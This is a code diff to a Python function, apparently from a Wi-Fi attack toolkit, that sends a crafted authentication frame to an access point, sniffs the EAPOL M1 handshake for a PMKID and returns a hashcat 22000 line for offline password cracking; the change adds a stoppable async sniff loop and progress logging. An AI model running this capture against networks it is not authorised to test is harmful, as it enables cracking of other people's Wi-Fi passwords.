@@ -2,7 +2,9 @@
 
 from __future__ import annotations
 
-from scapy.sendrecv import sendp, sniff
+import time
+
+from scapy.sendrecv import AsyncSniffer, sendp
 
 from ..frames import craft_auth, is_eapol
 from ..radio import set_channel
@@ -43,10 +45,21 @@ def capture_pmkid(
     client: str,
     channel: int | None = None,
     timeout: float = 10.0,
+    stop_event=None,
+    progress_fn=None,
 ) -> str | None:
-    """Send an auth frame and sniff EAPOL M1; return a 22000 line or None."""
+    """Send an auth frame and sniff EAPOL M1; return a 22000 line or None.
+
+    Uses AsyncSniffer + a poll loop (not blocking sniff()) so stop_event
+    can actually abort mid-capture instead of always running the full
+    timeout — previously this was the one attack with zero Stop Attack
+    responsiveness at all.
+    """
+    log = progress_fn or (lambda msg: None)
     if channel is not None:
         set_channel(iface, channel)
+        log(f"channel set to {channel}")
+    log(f"sending auth frame to {bssid} (from {client})")
     sendp(craft_auth(bssid=bssid, client=client), iface=iface, verbose=False)
     found: list[str] = []
 
@@ -62,5 +75,26 @@ def capture_pmkid(
         if pmkid:
             found.append(to_22000(pmkid, bssid, client))
 
-    sniff(iface=iface, timeout=timeout, prn=handler, store=False)
+    log(f"sniffing for EAPOL M1 (up to {timeout:.0f}s)...")
+    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
+    sniffer.start()
+    deadline = time.monotonic() + timeout
+    stopped = False
+    while time.monotonic() < deadline and not found:
+        if stop_event is not None and stop_event.is_set():
+            stopped = True
+            break
+        if not sniffer.thread or not sniffer.thread.is_alive():
+            break
+        time.sleep(0.2)
+    try:
+        sniffer.stop()
+    except Exception:
+        pass
+    if found:
+        log("PMKID found in EAPOL M1")
+    elif stopped:
+        log("PMKID capture stopped")
+    else:
+        log("no PMKID seen (timeout)")
     return found[0] if found else None
